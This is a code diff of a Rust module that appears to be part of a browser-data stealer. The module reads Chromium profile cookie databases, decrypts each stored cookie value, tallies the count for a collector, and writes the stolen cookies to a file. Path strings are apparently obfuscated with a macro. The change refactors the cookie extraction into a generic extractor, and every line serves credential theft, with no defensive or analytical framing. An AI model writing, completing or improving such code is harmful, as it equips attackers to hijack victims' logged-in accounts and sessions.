@@ -1,10 +1,10 @@
 use crate::alloc::borrow::ToOwned;
 use crate::chromium::{BrowserData, decrypt_data};
-use crate::{Cookie, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all};
+use crate::{Cookie, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all, ExtractExt};
 use alloc::sync::Arc;
 use derive_new::new;
 use collector::{Browser, Collector};
-use database::TableRecord;
+use database::{TableRecord, Value};
 use filesystem::FileSystem;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
@@ -31,7 +31,14 @@ impl<C: Collector, F: FileSystem> Task<C, F> for CookiesTask {
             &StorageFileSystem,
             |profile| profile / s!("Network") / s!("Cookies"),
             s!("Cookies"),
-            |record| extract_cookie_from_record(record, &self.browser),
+            Cookie::make_extractor((
+                COOKIES_HOST_KEY,
+                COOKIES_NAME,
+                COOKIES_PATH,
+                COOKIES_EXPIRES_UTC,
+                COOKIES_ENCRYPTED_VALUE,
+                |value| decrypt_data(&value.as_blob()?, &self.browser).map(Into::into)
+            )),
         ) else {
             return;
         };
@@ -39,25 +46,4 @@ impl<C: Collector, F: FileSystem> Task<C, F> for CookiesTask {
         collector.get_browser().increase_cookies_by(cookies.len());
         let _ = to_string_and_write_all(&cookies, "\n", filesystem, parent);
     }
-}
-
-fn extract_cookie_from_record<R: TableRecord>(
-    record: &R,
-    browser_data: &BrowserData,
-) -> Option<Cookie> {
-    let host_key = record.get_value(COOKIES_HOST_KEY)?.as_string()?;
-    let name = record.get_value(COOKIES_NAME)?.as_string()?;
-    let path = record.get_value(COOKIES_PATH)?.as_string()?;
-    let expires_utc = record.get_value(COOKIES_EXPIRES_UTC)?.as_integer()?;
-
-    let encrypted_value = record.get_value(COOKIES_ENCRYPTED_VALUE)?.as_blob()?;
-    let value = decrypt_data(&encrypted_value, browser_data)?.into();
-
-    Some(Cookie {
-        host_key,
-        name,
-        value,
-        path,
-        expires_utc,
-    })
 }
